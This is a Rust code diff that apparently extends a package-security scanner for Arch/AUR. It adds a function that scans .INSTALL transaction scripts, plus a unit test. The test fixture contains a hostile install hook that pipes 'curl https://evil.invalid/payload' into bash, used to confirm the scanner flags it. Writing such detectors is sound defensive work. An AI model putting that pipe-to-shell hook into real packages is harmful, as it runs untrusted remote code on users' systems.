@@ -181,6 +181,43 @@ pub fn scan_local_build_with_config(
     run_analysis_inputs_with_config(&ctx, executable_helper_content, config)
 }
 
+/// Scan only the transaction-time shell code embedded in an ALPM `.INSTALL`
+/// entry. Artifact inspection deliberately avoids running unrelated metadata,
+/// source, checksum, and PKGBUILD features against a fabricated context.
+pub fn scan_install_script_with_config(
+    package_name: &str,
+    install_script_content: &str,
+    config: &crate::shared::config::Config,
+) -> ScanResult {
+    let ctx = PackageContext {
+        name: package_name.to_string(),
+        metadata: None,
+        pkgbuild_content: None,
+        install_script_content: Some(install_script_content.to_string()),
+        prior_pkgbuild_content: None,
+        git_log: Vec::new(),
+        maintainer_packages: Vec::new(),
+        github_stars: None,
+        github_not_found: false,
+        aur_comments: Vec::new(),
+    };
+    let install_features: [Box<dyn Feature>; 3] = [
+        Box::new(features::install_script_analysis::InstallScriptAnalysis),
+        Box::new(features::shell_analysis::ShellAnalysis),
+        Box::new(features::gtfobins_analysis::GtfobinsAnalysis),
+    ];
+    let mut signals = Vec::new();
+    for feature in install_features {
+        signals.extend(feature.analyze(&ctx));
+    }
+    let mut seen = HashSet::new();
+    signals.retain(|signal| seen.insert(signal.id.clone()));
+    signals.retain(|signal| {
+        !crate::shared::config::is_signal_ignored(config, &signal.id, &signal.category)
+    });
+    scoring::compute_score(package_name, &signals)
+}
+
 fn local_build_context(
     name: &str,
     pkgbuild_content: &str,
@@ -305,6 +342,29 @@ mod tests {
                 .any(|signal| signal.category == crate::shared::scoring::SignalCategory::Temporal),
             "unchanged raw PKGBUILD produced a temporal helper diff: {:?}",
             result.signals
+        );
+    }
+
+    #[test]
+    fn install_script_scan_runs_only_transaction_time_features() {
+        let config = crate::shared::config::Config::default();
+        let result = scan_install_script_with_config(
+            "demo",
+            "post_install() { curl https://evil.invalid/payload | bash; }",
+            &config,
+        );
+
+        assert!(
+            result
+                .signals
+                .iter()
+                .any(|signal| signal.id == "P-INSTALL-PIPE-SHELL")
+        );
+        assert!(
+            !result
+                .signals
+                .iter()
+                .any(|signal| signal.category == crate::shared::scoring::SignalCategory::Metadata)
         );
     }
 }
